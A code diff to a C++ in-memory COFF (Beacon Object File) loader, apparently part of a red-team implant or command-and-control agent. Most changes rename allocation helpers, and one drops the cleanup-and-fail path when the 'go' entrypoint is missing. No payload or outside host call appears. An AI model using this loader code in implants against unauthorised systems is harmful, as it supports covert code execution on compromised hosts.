@@ -37,7 +37,7 @@ auto Coff::Add(
     ULONG CmdID,
     PVOID Entry
 ) -> BOF_OBJ* {
-    BOF_OBJ* NewObj = (BOF_OBJ*)hAlloc( sizeof( BOF_OBJ ) );
+    BOF_OBJ* NewObj = (BOF_OBJ*)KhAlloc( sizeof( BOF_OBJ ) );
 
     if (
         ! MmBegin ||
@@ -77,7 +77,7 @@ auto Coff::Rm(
 
     if ( this->Node == Obj ) {
         BOF_OBJ* NextNode = this->Node->Next;
-        hFree( this->Node );
+        KhFree( this->Node );
         this->Node = NextNode;
         return TRUE;
     }
@@ -89,7 +89,7 @@ auto Coff::Rm(
 
     if ( Previous->Next == Obj ) {
         BOF_OBJ* NextNode = Obj->Next;
-        hFree(Obj);      
+        KhFree(Obj);      
         Previous->Next = NextNode;
         return TRUE;
     }
@@ -290,13 +290,13 @@ auto Coff::Map(
 
     COFF_DATA CoffData = { 0 };
 
-    CoffData.Sec = (SECTION_DATA*)hAlloc( SecNbrs * sizeof(SECTION_DATA) );
-    CoffData.Sym = (SYMBOL_DATA*)hAlloc( SymNbrs * sizeof(SYMBOL_DATA) );
+    CoffData.Sec = (SECTION_DATA*)KhAlloc( SecNbrs * sizeof(SECTION_DATA) );
+    CoffData.Sym = (SYMBOL_DATA*)KhAlloc( SymNbrs * sizeof(SYMBOL_DATA) );
     
     if ( !CoffData.Sec || !CoffData.Sym ) {
         KhDbg("failed to allocate memory for sections/symbols");
-        if ( CoffData.Sec ) hFree( CoffData.Sec );
-        if ( CoffData.Sym ) hFree( CoffData.Sym );
+        if ( CoffData.Sec ) KhFree( CoffData.Sec );
+        if ( CoffData.Sym ) KhFree( CoffData.Sym );
         return FALSE;
     }
 
@@ -355,8 +355,8 @@ auto Coff::Map(
     MmBase = Self->Mm->Alloc( nullptr, MmSize, MEM_COMMIT, PAGE_READWRITE );
     if ( !MmBase ) {
         KhDbg("failed to allocate memory for COFF");
-        hFree( CoffData.Sec );
-        hFree( CoffData.Sym );
+        KhFree( CoffData.Sec );
+        KhFree( CoffData.Sym );
         return FALSE;
     }
 
@@ -414,8 +414,8 @@ auto Coff::Map(
     }
 
     if ( ExecCount > 0 ) {
-        Mapped->ExecSections = (PVOID*)hAlloc( ExecCount * sizeof(PVOID) );
-        Mapped->ExecSizes    = (ULONG*)hAlloc( ExecCount * sizeof(ULONG) );
+        Mapped->ExecSections = (PVOID*)KhAlloc( ExecCount * sizeof(PVOID) );
+        Mapped->ExecSizes    = (ULONG*)KhAlloc( ExecCount * sizeof(ULONG) );
         
         if ( Mapped->ExecSections && Mapped->ExecSizes ) {
             ULONG idx = 0;
@@ -462,13 +462,7 @@ auto Coff::Map(
     }
 
     if ( !EntryPoint ) {
-        KhDbg("failed to find 'go' entrypoint");
-        Self->Mm->Free( MmBase, MmSize, MEM_RELEASE );
-        hFree( CoffData.Sec );
-        hFree( CoffData.Sym );
-        if ( Mapped->ExecSections ) hFree( Mapped->ExecSections );
-        if ( Mapped->ExecSizes )    hFree( Mapped->ExecSizes );
-        return FALSE;
+        KhDbg("'go' entrypoint not found - COFF may use custom entry points");
     }
 
     Mapped->MmBase       = MmBase;
@@ -629,10 +623,10 @@ auto Coff::Unmap(
         Self->Mm->Free( Mapped->MmBase, Mapped->MmSize, MEM_RELEASE );
     }
 
-    if ( Mapped->CoffData.Sec )  hFree( Mapped->CoffData.Sec );
-    if ( Mapped->CoffData.Sym )  hFree( Mapped->CoffData.Sym );
-    if ( Mapped->ExecSections )  hFree( Mapped->ExecSections );
-    if ( Mapped->ExecSizes )     hFree( Mapped->ExecSizes );
+    if ( Mapped->CoffData.Sec )  KhFree( Mapped->CoffData.Sec );
+    if ( Mapped->CoffData.Sym )  KhFree( Mapped->CoffData.Sym );
+    if ( Mapped->ExecSections )  KhFree( Mapped->ExecSections );
+    if ( Mapped->ExecSizes )     KhFree( Mapped->ExecSizes );
 
     Mem::Zero( (UPTR)Mapped, sizeof(COFF_MAPPED) );
 
